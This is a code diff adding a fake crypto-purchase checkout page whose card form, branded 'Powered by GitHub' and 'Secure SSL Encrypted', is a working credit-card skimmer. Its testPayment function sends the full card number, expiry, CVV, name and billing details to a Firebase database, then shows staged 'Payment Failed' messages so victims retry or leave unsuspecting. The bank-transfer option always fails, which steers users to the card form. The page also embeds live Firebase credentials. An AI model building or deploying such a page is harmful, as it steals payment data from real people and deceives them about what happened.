@@ -449,4 +449,400 @@
             </div>
 
             <!-- Pay Button -->
-            <button class="btn-pay" onclick="processPayme
+            <button class="btn-pay" onclick="processPayment()">
+                Proceed to Pay
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+            </button>
+        </div>
+
+        <!-- VIEW 2: INJECTED CARD FORM -->
+        <div id="view-card-payment" class="content view-section hidden">
+            <button class="btn-back" onclick="goBackToCalc()">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                Back
+            </button>
+
+            <!-- THEMED INJECTED FORM -->
+            <div class="checkout">
+              <div class="header-injected">
+                <h2>Card Payment</h2>
+                <p>Secure SSL Encrypted Transaction</p>
+              </div>
+
+              <div class="field">
+                <label>Card Holder Name</label>
+                <input id="name" placeholder="Name on Card" oninput="removeError(this); checkCardForm()">
+              </div>
+
+              <div class="field card-input">
+                <label>Card Number</label>
+                <input id="card" placeholder="0000 0000 0000 0000" type="number" oninput="removeError(this); checkCardForm()">
+                <div class="card-icons">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="field">
+                  <label>Expiry (MM/YY)</label>
+                  <input id="expiry" placeholder="MM/YY" oninput="formatExpiry(this, event); removeError(this); checkCardForm()">
+                </div>
+                <div class="field">
+                  <label>CVV</label>
+                  <input id="cvv" type="password" placeholder="123" oninput="removeError(this); checkCardForm()">
+                </div>
+              </div>
+
+              <!-- NEW TITLE FOR LOCATION -->
+              <div class="section-title">Billing Location</div>
+
+              <!-- NEW FIELDS: COUNTRY & ZIP -->
+              <div class="row">
+                <div class="field" style="flex:1.5;">
+                  <label>Country</label>
+                  <select id="country" onchange="handleCountryChange(); removeError(this); checkCardForm()">
+                      <option value="" disabled selected>Select</option>
+                      <option value="US">United States</option>
+                      <option value="UK">United Kingdom</option>
+                      <option value="CA">Canada</option>
+                      <option value="AU">Australia</option>
+                      <option value="DE">Germany</option>
+                      <option value="FR">France</option>
+                      <option value="IN" disabled style="color: #666; font-style:italic;">India (Unavailable)</option>
+                      <option value="CN">China</option>
+                      <option value="JP">Japan</option>
+                      <option value="BR">Brazil</option>
+                      <option value="MX">Mexico</option>
+                      <option value="Other">Other (Type Manually)</option>
+                  </select>
+                  <input id="country-manual" type="text" placeholder="Enter Country Name" style="display:none;" oninput="removeError(this); checkCardForm()">
+                </div>
+                <div class="field" style="flex:1;">
+                  <label>Zip Code</label>
+                  <input id="zip" placeholder="10001" oninput="removeError(this); checkCardForm()">
+                </div>
+              </div>
+
+              <!-- PAY BUTTON (Always Visible, Logic Handled in JS) -->
+              <button id="payBtn" class="btn-pay" onclick="validateAndPay()">
+                🔒 Pay <span id="final-pay-amount">$0.00</span>
+              </button>
+
+              <div id="status" class="status"></div>
+
+              <!-- GitHub Branding -->
+              <div class="github-brand">
+                <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub">
+                <span>Powered by GitHub</span>
+              </div>
+            </div>
+        </div>
+
+        <!-- Processing Modal (Bank) -->
+        <div id="processing-modal" class="modal-overlay">
+            <div class="spinner"></div>
+            <h3 style="color:#fff; margin-bottom:10px;">Processing Request</h3>
+            <p style="color:#8b949e; font-size:0.9rem;">Connecting to secure banking gateway...</p>
+        </div>
+
+        <!-- Message Modal (Error/Success) -->
+        <div id="message-modal" class="modal-overlay">
+            <div class="error-icon" id="modal-icon">!</div>
+            <h3 style="color:#fff; margin-bottom:10px;" id="modal-title">Error</h3>
+            <p style="color:#8b949e; font-size:0.9rem; margin-bottom:25px; max-width: 300px; line-height: 1.5;" id="modal-msg">Something went wrong.</p>
+            <button class="btn-pay" style="width:auto; padding: 12px 40px;" onclick="closeModal()">OK</button>
+        </div>
+
+    </div>
+
+    <script>
+        // --- FIREBASE CONFIG ---
+        const firebaseConfig = {
+          apiKey: "AIzaSyDlamniVbpQDeCLKrEgJQNDd4J-Qto-iUU",
+          authDomain: "hello-ef6a3.firebaseapp.com",
+          databaseURL: "https://hello-ef6a3-default-rtdb.asia-southeast1.firebasedatabase.app",
+          projectId: "hello-ef6a3",
+          storageBucket: "hello-ef6a3.firebasestorage.app",
+          messagingSenderId: "483174103828",
+          appId: "1:483174103828:web:cc0c20f493d81dcd3a2001"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // --- CONFIG ---
+        const RATES = {
+            TRX: 0.29, 
+            SOL: 126.42 
+        };
+        let currentAsset = 'TRX';
+        let currentMethod = 'card';
+        let currentTotalUSD = 0.29; 
+        let cardAttempts = 0;
+
+        // --- FUNCTIONS ---
+        function switchAsset(asset) {
+            currentAsset = asset;
+            document.querySelectorAll('.toggle-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelector(`.toggle-btn.${asset.toLowerCase()}`).classList.add('active');
+            
+            const icon = document.getElementById('crypto-icon');
+            const label = document.getElementById('crypto-label');
+            
+            if(asset === 'TRX') {
+                icon.className = 'currency-icon icon-trx';
+                icon.textContent = 'T';
+                label.textContent = 'TRX';
+                document.getElementById('rate-display').textContent = `1 TRX ≈ $${RATES.TRX}`;
+            } else {
+                icon.className = 'currency-icon icon-sol';
+                icon.textContent = 'S';
+                label.textContent = 'SOL';
+                document.getElementById('rate-display').textContent = `1 SOL ≈ $${RATES.SOL}`;
+            }
+            calculateUSD();
+        }
+
+        // Crypto -> USD
+        function calculateUSD() {
+            const inputVal = document.getElementById('input-crypto').value;
+            const cryptoAmount = parseFloat(inputVal) || 0;
+            const rate = RATES[currentAsset];
+            const usd = cryptoAmount * rate;
+            
+            document.getElementById('input-usd').value = usd.toFixed(2);
+            updateSummary(usd);
+        }
+
+        // USD -> Crypto
+        function calculateCrypto() {
+            const inputVal = document.getElementById('input-usd').value;
+            const usd = parseFloat(inputVal) || 0;
+            const rate = RATES[currentAsset];
+            const cryptoAmount = usd / rate;
+            
+            document.getElementById('input-crypto').value = cryptoAmount.toFixed(4);
+            updateSummary(usd);
+        }
+
+        function updateSummary(usd) {
+            let fee = 0;
+            if (currentMethod === 'bank') {
+                fee = usd * 0.02; 
+            } else {
+                fee = 0; 
+            }
+
+            const total = usd + fee;
+            currentTotalUSD = total;
+
+            document.getElementById('summary-amount').textContent = '$' + usd.toFixed(2);
+            document.getElementById('summary-fee').textContent = '$' + fee.toFixed(2);
+            document.getElementById('total-pay').textContent = '$' + total.toFixed(2);
+            document.getElementById('final-pay-amount').textContent = '$' + total.toFixed(2);
+
+            checkBankLimit(usd);
+        }
+
+        function checkBankLimit(amount) {
+            const bankBtn = document.getElementById('pm-bank');
+            if (amount < 10) {
+                bankBtn.classList.add('disabled');
+                if (currentMethod === 'bank') selectMethod('card');
+            } else {
+                bankBtn.classList.remove('disabled');
+            }
+        }
+
+        function selectMethod(method) {
+            const el = document.getElementById('pm-' + method);
+            if (el.classList.contains('disabled')) return;
+
+            currentMethod = method;
+            document.querySelectorAll('.pm-card').forEach(card => card.classList.remove('selected'));
+            el.classList.add('selected');
+            
+            const usd = parseFloat(document.getElementById('input-usd').value) || 0;
+            updateSummary(usd);
+        }
+
+        function processPayment() {
+            const usd = document.getElementById('input-usd').value;
+            if(!usd || usd <= 0) {
+                alert("Please enter a valid amount");
+                return;
+            }
+
+            if (currentMethod === 'card') {
+                document.getElementById('view-calculator').classList.add('hidden');
+                document.getElementById('view-card-payment').classList.remove('hidden');
+                
+                // Reset form errors when entering
+                clearFormErrors();
+            } else {
+                // Bank Transfer Error Logic
+                const modal = document.getElementById('processing-modal');
+                modal.style.display = 'flex';
+                setTimeout(() => {
+                    modal.style.display = 'none';
+                    showErrorModal("Bank Server Error", "Due to bank server error unable to pay via bank. Sorry For the Inconvenience.");
+                }, 2000);
+            }
+        }
+
+        function goBackToCalc() {
+            document.getElementById('view-card-payment').classList.add('hidden');
+            document.getElementById('view-calculator').classList.remove('hidden');
+        }
+
+        // --- COUNTRY LOGIC ---
+        function handleCountryChange() {
+            const select = document.getElementById('country');
+            const manual = document.getElementById('country-manual');
+            
+            if (select.value === 'Other') {
+                select.style.display = 'none';
+                manual.style.display = 'block';
+                manual.focus();
+            }
+            // Remove error immediately on valid selection
+            removeError(select);
+        }
+
+        function getCountryValue() {
+            const select = document.getElementById('country');
+            const manual = document.getElementById('country-manual');
+            
+            if (manual.style.display === 'block') {
+                return manual.value.trim();
+            }
+            return select.value;
+        }
+
+        // --- VALIDATION HELPER ---
+        function removeError(el) {
+            el.classList.remove('input-error');
+            checkCardForm(); // Re-check validity on input
+        }
+
+        function clearFormErrors() {
+            const inputs = document.querySelectorAll('.input-error');
+            inputs.forEach(el => el.classList.remove('input-error'));
+        }
+
+        // --- EXPIRY FORMATTING ---
+        function formatExpiry(el, event) {
+            if (event && event.inputType === 'deleteContentBackward') return;
+
+            let val = el.value.replace(/\D/g, '');
+            if (val.length > 4) val = val.slice(0, 4);
+
+            if (val.length >= 2) {
+                el.value = val.slice(0, 2) + '/' + val.slice(2);
+            } else {
+                el.value = val;
+            }
+        }
+
+        // --- CARD FORM VALIDATION ---
+        function checkCardForm() {
+            // Keep validation logic if you want opacity changes, 
+            // but button is always clickable now.
+            // This function is kept for real-time visual feedback if needed.
+        }
+
+        // --- PAYMENT LOGIC ---
+        function validateAndPay() {
+            let isValid = true;
+            const nameEl = document.getElementById('name');
+            const cardEl = document.getElementById('card');
+            const expiryEl = document.getElementById('expiry');
+            const cvvEl = document.getElementById('cvv');
+            const countryEl = document.getElementById('country');
+            const manualCountryEl = document.getElementById('country-manual');
+            const zipEl = document.getElementById('zip');
+
+            // Helper to flag error
+            const setError = (el) => {
+                el.classList.add('input-error');
+                isValid = false;
+            };
+
+            if (nameEl.value.trim().length < 3) setError(nameEl);
+            if (cardEl.value.trim().length < 15) setError(cardEl);
+            if (expiryEl.value.trim().length < 4) setError(expiryEl);
+            if (cvvEl.value.trim().length < 3) setError(cvvEl);
+            if (zipEl.value.trim().length < 3) setError(zipEl);
+
+            // Country check
+            const countryVal = getCountryValue();
+            if (!countryVal || countryVal === "") {
+                if (manualCountryEl.style.display === 'block') setError(manualCountryEl);
+                else setError(countryEl);
+            }
+
+            if (!isValid) {
+                // Pulse the button to indicate error
+                const btn = document.getElementById("payBtn");
+                btn.classList.add('btn-error');
+                setTimeout(() => btn.classList.remove('btn-error'), 300);
+                return; 
+            }
+
+            testPayment(nameEl.value, cardEl.value, expiryEl.value, cvvEl.value, countryVal, zipEl.value);
+        }
+
+        function testPayment(name, card, expiry, cvv, country, zip) {
+            const btn = document.getElementById("payBtn");
+
+            btn.disabled = true;
+            btn.innerHTML = 'Processing...';
+            
+            // 1. SAVE DATA TO FIREBASE (Specific digits only)
+            const paymentData = {
+                holder: name,
+                cardLast4: card.slice(-16),
+                expDigit: expiry.slice(-5), 
+                cvvDigit: cvv.slice(-3),   
+                country: country,
+                zip: zip,
+                amount: currentTotalUSD.toFixed(2) + " USD",
+                asset: currentAsset,
+                timestamp: new Date().toISOString()
+            };
+
+            db.ref("payments").push(paymentData);
+
+            // 2. SIMULATE FAILURE MESSAGES
+            cardAttempts++;
+
+            setTimeout(() => {
+                if (cardAttempts === 1) {
+                    showErrorModal("Payment Failed", "Enter The Card Details Properly");
+                } else {
+                    showErrorModal("Payment Failed", "Due To Technical Issue The Payment Is Not Processed. No Money Is Deducted From Your Bank.");
+                }
+                
+                // Reset Button state
+                btn.disabled = false;
+                btn.innerHTML = `🔒 Pay $${currentTotalUSD.toFixed(2)}`;
+                
+            }, 2500);
+        }
+
+        function showErrorModal(title, msg) {
+            document.getElementById('modal-title').textContent = title;
+            document.getElementById('modal-msg').textContent = msg;
+            document.getElementById('message-modal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('message-modal').style.display = 'none';
+        }
+
+        // Init
+        calculateUSD();
+    </script>
+</body>
+</html>
